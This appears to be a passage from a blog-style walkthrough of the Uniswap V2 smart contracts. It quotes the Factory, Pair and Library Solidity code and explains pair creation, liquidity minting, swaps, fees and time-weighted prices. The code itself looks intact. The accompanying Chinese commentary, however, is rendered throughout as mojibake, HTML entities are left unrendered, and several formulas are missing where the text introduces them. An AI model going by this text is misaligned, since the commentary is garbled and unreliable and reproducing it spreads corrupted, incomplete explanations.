&#125;\n&#125;\n\ncontract UniswapV2Factory is IUniswapV2Factory &#123;\n    address public feeTo;\n    address public feeToSetter;\n\n    mapping(address => mapping(address => address)) public getPair;\n    address[] public allPairs;\n\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    constructor(address _feeToSetter) public &#123;\n        feeToSetter = _feeToSetter;\n    &#125;\n\n    function allPairsLength() external view returns (uint) &#123;\n        return allPairs.length;\n    &#125;\n\n    function createPair(address tokenA, address tokenB) external returns (address pair) &#123;\n        require(tokenA != tokenB, 'UniswapV2: IDENTICAL_ADDRESSES');\n        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        require(token0 != address(0), 'UniswapV2: ZERO_ADDRESS');\n        require(getPair[token0][token1] == address(0), 'UniswapV2: PAIR_EXISTS'); // single check is sufficient\n        bytes memory bytecode = type(UniswapV2Pair).creationCode;\n        bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n        assembly &#123;\n            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)\n        &#125;\n        IUniswapV2Pair(pair).initialize(token0, token1);\n        getPair[token0][token1] = pair;\n        getPair[token1][token0] = pair; // populate mapping in the reverse direction\n        allPairs.push(pair);\n        emit PairCreated(token0, token1, pair, allPairs.length);\n    &#125;\n\n    function setFeeTo(address _feeTo) external &#123;\n        require(msg.sender == feeToSetter, 'UniswapV2: FORBIDDEN');\n        feeTo = _feeTo;\n    &#125;\n\n    function setFeeToSetter(address _feeToSetter) external &#123;\n        require(msg.sender == feeToSetter, 'UniswapV2: FORBIDDEN');\n        feeToSetter = _feeToSetter;\n    &#125;\n&#125;\n\n// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)\n\nlibrary SafeMath &#123;\n    function add(uint x, uint y) internal pure returns (uint z) &#123;\n        require((z = x + y) >= x, 'ds-math-add-overflow');\n    &#125;\n\n    function sub(uint x, uint y) internal pure returns (uint z) &#123;\n        require((z = x - y) &lt;= x, 'ds-math-sub-underflow');\n    &#125;\n\n    function mul(uint x, uint y) internal pure returns (uint z) &#123;\n        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');\n    &#125;\n&#125;\n\n// a library for performing various math operations\n\nlibrary Math &#123;\n    function min(uint x, uint y) internal pure returns (uint z) &#123;\n        z = x &lt; y ? x : y;\n    &#125;\n\n    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)\n    function sqrt(uint y) internal pure returns (uint z) &#123;\n        if (y > 3) &#123;\n            z = y;\n            uint x = y / 2 + 1;\n            while (x &lt; z) &#123;\n                z = x;\n                x = (y / x + x) / 2;\n            &#125;\n        &#125; else if (y != 0) &#123;\n            z = 1;\n        &#125;\n    &#125;\n&#125;\nlibrary UQ112x112 &#123;\n    uint224 constant Q112 = 2**112;\n\n    // encode a uint112 as a UQ112x112\n    function encode(uint112 y) internal pure returns (uint224 z) &#123;\n        z = uint224(y) * Q112; // never overflows\n    &#125;\n\n    // divide a UQ112x112 by a uint112, returning a UQ112x112\n    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) &#123;\n        z = x / uint224(y);\n    &#125;\n&#125;\n\n\n\nAnalyze1.UniswapV2ERC20.sol\né¦–å…ˆæ˜¯UniswapV2ERC20.solï¼Œæ˜¾è€Œæ˜“è§è¿™éƒ¨åˆ†ä»£ç å®žçŽ°äº†ä¸€ä¸ªERC-20çš„åˆçº¦ï¼Œä½†æ˜¯æ­¤å¤„å¤šäº†ä¸€ä¸ªpermitæ–¹æ³•ï¼Œå…·ä½“åŠŸèƒ½ç±»ä¼¼äºŽapprove\npermit, which allows users to modify the allowance mapping using a signed message, instead of through msg.sender\nå®˜æ–¹æ–‡æ¡£ç»™å‡ºå¦‚ä¸Šè§£é‡Š\nDOMAIN_SEPARATORåªä¸è¿‡æ˜¯å”¯ä¸€æ ‡è¯†æ™ºèƒ½åˆçº¦çš„å“ˆå¸Œã€‚ å®ƒæ˜¯ç”±EIP712Domainçš„å­—ç¬¦ä¸²ï¼ŒåŒ…å«ä»£å¸åˆçº¦çš„åç§°ï¼Œç‰ˆæœ¬ï¼Œæ‰€åœ¨çš„chainIdä»¥åŠåˆçº¦éƒ¨ç½²çš„åœ°å€æž„æˆã€‚\nPERMIT_TYPEHASH æ˜¯å‡½æ•°åç§°(å¤§å†™å¼€å¤´)å’Œæ‰€æœ‰å‚æ•°(åŒ…æ‹¬ç±»åž‹å’Œåç§°)çš„å“ˆå¸Œã€‚ ç›®çš„æ˜¯æ¸…æ¥šçš„æ ‡å¿—ç­¾åçš„å‡½æ•°ã€‚\n2.UniswapV2Factory.sol\nfeeToâ€“æ”¶è´¹åœ°å€\nfeeToSetterâ€“å¯ä»¥ä¿®æ”¹feetoçš„åœ°å€\ngetPairâ€“è®°å½•äº¤æ˜“å¯¹\nallPairsâ€“å…¨éƒ¨äº¤æ˜“å¯¹\nè¯¥éƒ¨åˆ†æœ‰ä¸‰ä¸ªæ–¹æ³•ï¼Œsetfeeto,setfeetosetterå’Œcreatepairï¼Œfeetoåªæœ‰feetosetterå¯ä»¥ä¿®æ”¹ï¼ŒfeeToSetteråªæœ‰feeToSetterå¯ä»¥ä¿®æ”¹\ncreatepairä¼šåˆ›å»ºäº¤æ˜“å¯¹ï¼Œå¯¹äºŽtokenåœ°å€ä¼šè¿›è¡ŒæŽ’åºï¼Œå°çš„å°çš„ä½œä¸ºtoken0ï¼Œå¤§çš„ä½œä¸ºtoken1ï¼Œä¹‹åŽä½¿ç”¨hash(token0ï¼Œtoken1)ä½œä¸ºsaltï¼Œä½¿ç”¨create2è¿›è¡Œpairåˆçº¦çš„éƒ¨ç½²ï¼Œå¹¶å°†æ–°çš„pairæ·»åŠ åˆ°getpairå’Œallpairä¸­ã€‚ç”±äºŽsaltå€¼å¯ä»¥çº¿ä¸‹è®¡ç®—å‡ºæ¥ï¼Œæ‰€ä»¥pairçš„åœ°å€æ˜¯å¯ä»¥è‡ªè¡Œè®¡ç®—çš„ã€‚\n3.UniswapV2Pair.sol\näº†è§£åˆ°è¿™éƒ¨åˆ†æ—¶è¦äº†è§£åˆ°UQ112x112éƒ¨åˆ†\nlibrary UQ112x112 &#123;\n    uint224 constant Q112 = 2**112;\n\n    // encode a uint112 as a UQ112x112\n    function encode(uint112 y) internal pure returns (uint224 z) &#123;\n        z = uint224(y) * Q112; // never overflows\n    &#125;\n\n    // divide a UQ112x112 by a uint112, returning a UQ112x112\n    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) &#123;\n        z = x / uint224(y);\n    &#125;\n&#125;\n\nå› ä¸ºsolidityä¸­ä¸å…è®¸å‡ºçŽ°å°æ•°ï¼Œä½†æ˜¯tokenæ•°é‡åˆä¸€å®šä¼šå‡ºçŽ°å°æ•°ï¼Œæ‰€ä»¥ä½¿ç”¨uint224ï¼Œå…¶ä¸­112ä½ä½œä¸ºæ•´æ•°éƒ¨åˆ†ï¼Œå¦112ä½ä½œä¸ºå°æ•°éƒ¨åˆ†ï¼Œè¿™æ ·ç²¾åº¦å³å¯è¾¾åˆ°1&#x2F;2**112,æœ€åŽçš„uint32ç”¨æ¥å­˜å‚¨timestamp\ninitializeå‡½æ•°ä¼šåœ¨åˆçº¦åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼Œåˆå§‹åŒ–factoryåœ°å€ï¼Œä»¥åŠä¸¤ä¸ªtokençš„address\nä»¥ä¸‹ä¸ºmintå‡½æ•°å’Œburnå‡½æ•°\nfunction mint(address to) external lock returns (uint liquidity) &#123;\n       (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n       uint balance0 = IERC20(token0).balanceOf(address(this));\n       uint balance1 = IERC20(token1).balanceOf(address(this));\n       uint amount0 = balance0.sub(_reserve0);\n       uint amount1 = balance1.sub(_reserve1);\n\n       bool feeOn = _mintFee(_reserve0, _reserve1);\n       uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n       if (_totalSupply == 0) &#123;\n           liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n          _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n       &#125; else &#123;\n           liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n       &#125;\n       require(liquidity > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED');\n       _mint(to, liquidity);\n\n       _update(balance0, balance1, _reserve0, _reserve1);\n       if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n       emit Mint(msg.sender, amount0, amount1);\n   &#125;\n    function burn(address to) external lock returns (uint amount0, uint amount1) &#123;\n       (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n       address _token0 = token0;                                // gas savings\n       address _token1 = token1;                                // gas savings\n       uint balance0 = IERC20(_token0).balanceOf(address(this));\n       uint balance1 = IERC20(_token1).balanceOf(address(this));\n       uint liquidity = balanceOf[address(this)];\n\n       bool feeOn = _mintFee(_reserve0, _reserve1);\n       uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n       amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n       amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n       require(amount0 > 0 &amp;&amp; amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');\n       _burn(address(this), liquidity);\n       _safeTransfer(_token0, to, amount0);\n       _safeTransfer(_token1, to, amount1);\n       balance0 = IERC20(_token0).balanceOf(address(this));\n       balance1 = IERC20(_token1).balanceOf(address(this));\n\n       _update(balance0, balance1, _reserve0, _reserve1);\n       if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n       emit Burn(msg.sender, amount0, amount1, to);\n   &#125;\n\né“¸å¸æµç¨‹å‘ç”Ÿåœ¨routeråˆçº¦å‘pairåˆçº¦å‘é€ä»£å¸ä¹‹åŽï¼Œå› æ­¤æ­¤æ¬¡çš„å‚¨å¤‡é‡å’Œåˆçº¦çš„tokenä½™é¢æ˜¯ä¸ç›¸ç­‰çš„ï¼Œä¸­é—´çš„å·®å€¼å°±æ˜¯éœ€è¦é“¸å¸çš„tokené‡‘é¢ã€‚ç„¶åŽèŽ·å–æ€»çš„æµåŠ¨æ€§çš„ä¾›åº”é‡totoalSupplyï¼Œå¦‚æžœtotalSupplyç­‰äºŽ0çš„è¯ï¼Œå°±ä»£è¡¨æ˜¯é¦–æ¬¡é“¸å¸ã€‚\n\nå…·ä½“å‚è€ƒwhitepaperç¬¬3.4èŠ‚\nå…¶ä¸­ç»™å‡ºäº†å¦‚ä¸‹çš„è§£é‡Š\nFor example, suppose that the price of 1 ABC is currently 100 XYZ. If the initial deposit had been 2 ABC and 200 XYZ (a ratio of 1:100), the depositor would have received âˆš 2 Â· 200 &#x3D; 20 shares. Those shares should now still be worth 2 ABC and 200 XYZ, plus accumulated fees. If the initial deposit had been 2 ABC and 800 XYZ (a ratio of 1:400), the depositor would have received âˆš 2 Â· 800 &#x3D; 40 pool shares.\nè‡³äºŽä¸ºä»€ä¹ˆåœ¨ç¬¬ä¸€æ¬¡mintæ—¶è¦æœ‰æœ€å°çš„é™é¢ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢æ¶æ„æŠ¬é«˜ä»·æ ¼ï¼Œæ¯”å¦‚å…ˆä»¥1ï¼Œè¿›è¡Œmintï¼Œåœ¨ä½¿ç”¨å¤§é¢æ•°é‡çš„tokenï¼Œæ¯”å¦‚è¯´1000000000tokenè¿›è¡Œsyncï¼Œæ­¤æ—¶totalsupplyè¿˜æ˜¯ä¸º1ï¼Œä½†reserve0å’Œreserveï¼Œä¸€ä¸ªä¸º1ï¼Œä¸€ä¸ªä¸º100000001ï¼Œæ‰€ä»¥lptokenå¾—ä»·æ ¼å°±å˜æˆäº†1000000001ï¼Œä½¿å¾—æ•£æˆ·éš¾ä»¥å‚ä¸Ž\né”€æ¯é€»è¾‘å‚ç…§ä»£ç \nå¦‚æžœå¼€å¯äº†æ‰‹ç»­è´¹ï¼Œå°±é‡æ–°è®¡ç®—kå€¼\nswapå‡½æ•°ï¼š\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123;\n     require(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT');\n     (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n     require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');\n\n     uint balance0;\n     uint balance1;\n     &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors\n     address _token0 = token0;\n     address _token1 = token1;\n     require(to != _token0 &amp;&amp; to != _token1, 'UniswapV2: INVALID_TO');\n     if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n     if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n     if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);\n     balance0 = IERC20(_token0).balanceOf(address(this));\n     balance1 = IERC20(_token1).balanceOf(address(this));\n     &#125;\n     uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n     uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n     require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');\n     &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors\n     uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n     uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n     require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');\n     &#125;\n\n     _update(balance0, balance1, _reserve0, _reserve1);\n     emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n &#125;\n\näº¤æ¢tokenæ–¹æ³•ä¸€èˆ¬é€šè¿‡routeråˆçº¦è°ƒç”¨ï¼ŒåŠŸèƒ½æ˜¯äº¤æ¢tokenï¼Œé¦–å…ˆç¡®è®¤amount0Outæˆ–è€…amount1Outæœ‰ä¸€ä¸ªå¤§äºŽ0ï¼Œç„¶åŽç¡®ä¿å‚¨å¤‡é‡å¤§äºŽè¦å–å‡ºçš„é‡‘é¢ã€‚ç„¶åŽç¡®ä¿address(to)ä¸ç­‰äºŽå¯¹åº”çš„tokenåœ°å€ã€‚ç„¶åŽå‘é€tokenåˆ°å¯¹åº”çš„åœ°å€ä¸Šã€‚å¦‚æžœdataéžç©ºï¼Œå°±æ‰§è¡Œé—ªç”µè´·çš„è°ƒç”¨ã€‚é€šè¿‡è°ƒç”¨address(to)ä¸‹çš„uniswapV2Callå‡½æ•°è¿›è¡Œé—ªç”µè´·ä»¥åŠæ‰‹ç»­è´¹çš„å½’è¿˜\namount0inå’Œamount1inåˆ¤æ–­è°ƒç”¨è€…æ˜¯å¦è½¬å…¥å¦ä¸€tokenï¼Œå¦‚æžœæ²¡æœ‰å°±revertï¼Œå¦‚æžœæœ‰è¾“å…¥ï¼Œè¿˜éœ€è¦ä¿è¯äº¤æ¢ä¹‹åŽçš„å‚¨å¤‡é‡çš„ä¹˜ç§¯å¤§äºŽç­‰äºŽk,å…·ä½“ä»£ç ä¸­è®¡ç®—å…¬å¼å¦‚ä¸‹\n\nä¹‹æ‰€ä»¥å†™ä½œè¿™æ ·æ˜¯å› ä¸ºsolidityä¸­æ²¡æœ‰å°æ•°ï¼Œæ‰€ä»¥ä»£ç ä¸­è¡¨ç¤ºä¸ºï¼š\n\nfunction _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123;\n       address feeTo = IUniswapV2Factory(factory).feeTo();\n       feeOn = feeTo != address(0);\n       uint _kLast = kLast; // gas savings\n       if (feeOn) &#123;\n           if (_kLast != 0) &#123;\n               uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));\n               uint rootKLast = Math.sqrt(_kLast);\n               if (rootK > rootKLast) &#123;\n                   uint numerator = totalSupply.mul(rootK.sub(rootKLast));\n                   uint denominator = rootK.mul(5).add(rootKLast);\n                   uint liquidity = numerator / denominator;\n                   if (liquidity > 0) _mint(feeTo, liquidity);\n               &#125;\n           &#125;\n       &#125; else if (_kLast != 0) &#123;\n           kLast = 0;\n       &#125;\n   &#125;\n\nmintfeeeå‡½æ•°å¯ç”¨äºŽåˆ¤æ–­å¹³å°æ˜¯å¦æ”¶å–æ‰‹ç»­è´¹ï¼Œå› ä¸ºæ¯ä¸€ç¬”äº¤æ˜“éƒ½ä¼šæœ‰åƒåˆ†ä¹‹ä¸‰çš„æ‰‹ç»­è´¹ï¼Œé‚£ä¹ˆkå€¼ä¹Ÿä¼šéšç€ç¼“æ…¢å¢žåŠ ï¼Œæ‰€ä»¥è¿žç»­ä¸¤ä¸ªæ—¶åˆ»ä¹‹é—´çš„kå€¼å·®å€¼å°±æ˜¯è¿™æ®µæ—¶é—´çš„æ‰‹ç»­è´¹ã€‚å³\n\nå†è¿›è¡ŒæµåŠ¨æ€§è®¡ç®—å¹¶ä¸”é“¸é€ ç»™feetoï¼Œå…¬å¼ä¸º\n\n.\nfunction _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123;\n        require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), 'UniswapV2: OVERFLOW');\n        uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n        if (timeElapsed > 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123;\n            // * never overflows, and + overflow is desired\n            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n        &#125;\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n        blockTimestampLast = blockTimestamp;\n        emit Sync(reserve0, reserve1);\n    &#125;\n\nupdateå‡½æ•°ä¼šè®¡ç®—å‡ºæ—¶é—´é—´éš”ï¼Œæ›´æ–°å‚¨å¤‡é‡ï¼Œå¹¶ä¸”è®¡ç®—â€œç´¯è®¡â€ä»·æ ¼æ—¶é—´å€¼ï¼Œprice0CumulativeLast æ˜¯ä¸€ä¸ªæ¯ç§’é’ŸæŒ‰ä¸¤ä¸ªå‚¨é‡çš„æ¯”çŽ‡é€’å¢žçš„å€¼ã€‚è¦å°†æ­¤å€¼è½¬æ¢å›žä»·æ ¼ï¼Œéœ€è¦ä¸¤ä¸ªæ—¶é—´ç‚¹å€¼ price0CumulativeLastï¼Œä½¿ç”¨ä»¥ä¸‹å…¬å¼ï¼š\n\né€šè¿‡å°†ä¸¤ä¸ªæ ·æœ¬ä¸­ä»·æ ¼ç´¯è®¡çš„å·®å€¼é™¤ä»¥è¿™ä¸¤ä¸ªæ ·æœ¬ä¹‹é—´çš„ç§’æ•°ï¼Œè¿‡ç¨‹è¢«é€†è½¬ï¼Œç»“æžœå°±æ˜¯è¯¥æ—¶æ®µçš„æ—¶é—´åŠ æƒä»·æ ¼ã€‚\nfunction skim(address to) external lock &#123;\n    address _token0 = token0; // gas savings\n    address _token1 = token1; // gas savings\n    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));\n    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));\n&#125;\n\n// force reserves to match balances\nfunction sync() external lock &#123;\n    _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n&#125;\n\nskimæ–¹æ³•æ˜¯å¼ºåˆ¶è®©ä½™é¢ä¸Žå‚¨å¤‡é‡å¯¹ç­‰ï¼Œsyncæ–¹æ³•åˆ™æ˜¯å¼ºåˆ¶è®©å‚¨å¤‡é‡ä¸Žä½™é¢å¯¹ç­‰\nUniswapV2Library\nClick to see more\nlibrary UniswapV2Library &#123;\n    using SafeMath for uint;\n\n    // returns sorted token addresses, used to handle return values from pairs sorted in this order\n    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) &#123;\n        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');\n        (token0, token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');\n    &#125;\n\n    // calculates the CREATE2 address for a pair without making any external calls\n    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) &#123;\n        (address token0, address token1) = sortTokens(tokenA, tokenB);\n        pair = address(uint(keccak256(abi.encodePacked(\n                hex'ff',\n                factory,\n                keccak256(abi.encodePacked(token0, token1)),\n                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\n            ))));\n    &#125;\n\n    // fetches and sorts the reserves for a pair\n    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) &#123;\n        (address token0,) = sortTokens(tokenA, tokenB);\n        (uint reserve0, uint reserve1,) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();\n        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n    &#125;\n\n    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset\n    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) &#123;\n        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');\n        require(reserveA > 0 &amp;&amp; reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        amountB = amountA.mul(reserveB) / reserveA;\n    &#125;\n\n    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) &#123;\n        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');\n        require(reserveIn > 0 &amp;&amp; reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        uint amountInWithFee = amountIn.mul(997);\n        uint numerator = amountInWithFee.mul(reserveOut);\n        uint denominator = reserveIn.mul(1000).add(amountInWithFee);\n        amountOut = numerator / denominator;\n    &#125;\n\n    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) &#123;\n        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');\n        require(reserveIn > 0 &amp;&amp; reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        uint numerator = reserveIn.mul(amountOut).mul(1000);\n        uint denominator = reserveOut.sub(amountOut).mul(997);\n        amountIn = (numerator / denominator).add(1);\n    &#125;\n\n    // performs chained getAmountOut calculations on any number of pairs\n    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) &#123;\n        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');\n        amounts = new uint[](path.length);\n        amounts[0] = amountIn;\n        for (uint i; i &lt; path.length - 1; i++) &#123;\n            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);\n            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);\n        &#125;\n    &#125;\n\n    // performs chained getAmountIn calculations on any number of pairs\n    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) &#123;\n        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');\n        amounts = new uint[](path.length);\n        amounts[amounts.length - 1] = amountOut;\n        for (uint i = path.length - 1; i > 0; i--) &#123;\n            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);\n            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);\n        &#125;\n    &#125;\n&#125;\n\n\n\nAnalyzefunction sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) &#123;\n    require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');\n    (token0, token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n    require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');\n&#125;\n\né¦–å…ˆæ˜¯sorttokenså‡½æ•°ï¼Œè¯¥å‡½æ•°é¦–å…ˆåˆ¤æ–­token0å’Œtoken1æ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œåœ¨è¿›è¡Œå¤§å°åŒºåˆ†ï¼Œå°çš„ä¸ºtoken0ï¼Œå¤§çš„ä¸ºtoken1ï¼Œå¹¶ä¸”åˆ¤æ–­æ²¡æœ‰tokençš„åœ°å€ä¸º0ï¼Œå’Œä¸Šè¿°createpairå‡½æ•°å†…çš„åœ°å€æŽ’åºåŠŸèƒ½ç›¸åŒ\nfunction pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) &#123;\n    (address token0, address token1) = sortTokens(tokenA, tokenB);\n    pair = address(uint(keccak256(abi.encodePacked(\n            hex'ff',\n            factory,\n            keccak256(abi.encodePacked(token0, token1)),\n            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\n        ))));\n&#125;\n\npairForå‡½æ•°ç”¨äºŽè®¡ç®—ç”Ÿæˆçš„äº¤æ˜“å¯¹çš„åœ°å€ï¼Œå…·ä½“å‚è€ƒcreate2æ–¹æ³•\n\n\nfunction getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) &#123;\n    (address token0,) &#x3D; sortTokens(tokenA, tokenB);\n    (uint reserve0, uint reserve1,) &#x3D; IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();\n    (reserveA, reserveB) &#x3D; tokenA &#x3D;&#x3D; token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n&#125;\n\ngetReserveså‡½æ•°èŽ·å–token0ä»¥åŠtoken1çš„å‚¨å¤‡å€¼ï¼ˆæ’å®šä¹˜ç§¯çš„å„èµ„äº§çš„å€¼ï¼‰\nfunction quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) &#123;\n    require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');\n    require(reserveA > 0 &amp;&amp; reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n    amountB = amountA.mul(reserveB) / reserveA;\n&#125;\n\nquoteå‡½æ•°æ ¹æ®ç»™å®šçš„ä¸¤ä¸ª token çš„å‚¨å¤‡é‡å’Œå…¶ä¸­ä¸€ä¸ª token æ•°é‡ï¼Œè®¡ç®—å¾—åˆ°å¦ä¸€ä¸ª token ç­‰å€¼çš„æ•°å€¼\nfunction getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) &#123;\n        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');\n        require(reserveIn > 0 &amp;&amp; reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        uint amountInWithFee = amountIn.mul(997);\n        uint numerator = amountInWithFee.mul(reserveOut);\n        uint denominator = reserveIn.mul(1000).add(amountInWithFee);\n        amountOut = numerator / denominator;\n    &#125;\n\næ ¹æ®æ’å®škå€¼ï¼Œåº”æœ‰å…¬å¼å¦‚ä¸‹\n\nä¸Šè¿°ä¸ºä¸è€ƒè™‘æ‰‹ç»­è´¹çš„æƒ…å†µä¸‹ï¼Œè€Œå®žé™…ä¸Šä¼šæ”¶å–åƒåˆ†ä¹‹ä¸‰çš„æ‰‹ç»­è´¹ï¼Œæ‰€ä»¥amountInå˜æˆäº†amountIn*997&#x2F;1000\nä»£å…¥å…¬å¼ï¼ˆæ³¨æ„solidityä¸­æ²¡æœ‰å°æ•°ï¼Œåˆ†å­åˆ†æ¯åŒæ—¶ä¹˜ä»¥1000ï¼‰å¾—åˆ°å¦‚ä¸‹å…¬å¼\n\nå³ä»£ç ä¸­å®žçŽ°çš„è®¡ç®—å…¬å¼\ngetAmountInå‡½æ•°é€»è¾‘ç±»ä¼¼\nfunction getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) &#123;\n    require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');\n    amounts = new uint[](path.length);\n    amounts[0] = amountIn;\n    for (uint i; i &lt; path.length - 1; i++) &#123;\n        (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);\n        amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);\n    &#125;\n&#125;\n\ngetAmountsOutå‡½æ•°å®žçŽ°äº†æ²¿ç€ä¸€ä¸ªè·¯å¾„è¿›è¡Œå…‘æ¢çš„åŠŸèƒ½ï¼Œæ¯”å¦‚Token0-&gt;Token1-&gt;Token2-&gt;Token3ï¼Œå¹¶å°†è®¡ç®—å‡ºçš„amountsä»¥æ•°ç»„å½¢å¼è¿”å›žï¼Œæ¯æ¬¡å…‘æ¢éƒ½ä¼šè°ƒç”¨getAmountOutå’ŒgetAmountInå‡½æ•°ï¼Œæ‰€ä»¥æ¯æ¬¡å…‘æ¢éƒ½ä¼šæ‰£é™¤æ‰‹ç»­è´¹ï¼Œå› 